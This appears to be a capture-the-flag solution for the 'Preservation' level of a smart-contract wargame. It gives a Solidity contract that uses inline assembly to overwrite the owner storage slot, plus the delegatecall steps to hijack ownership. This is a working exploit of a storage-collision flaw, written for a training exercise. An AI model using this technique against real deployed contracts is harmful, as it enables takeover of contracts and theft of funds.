# Preservation

# How to complete
S1 - Deploy the following contract
```solidity
contract Solver {
    function setTime(uint256) public {
      // overwrite the owner slot
        assembly {
            sstore(2, 0xD1B9C015FBA1D7B631791A2201411a378fd562e7) // the address of the account you're solving with
        }
    }
}
```

S2 - Call `setFirstTime` on Preservation passing in the decimal value of the address of the Solver contract

After this step, the `timeZone1Library` will hold the address of our Solver contract.

S3 - Call `setFirstTime` with any value

Now calling `setFirstTime` will call the `setTime` function in the Solver, overwriting slot 2 (the `owner` slot) of Preservation with the address of your choice.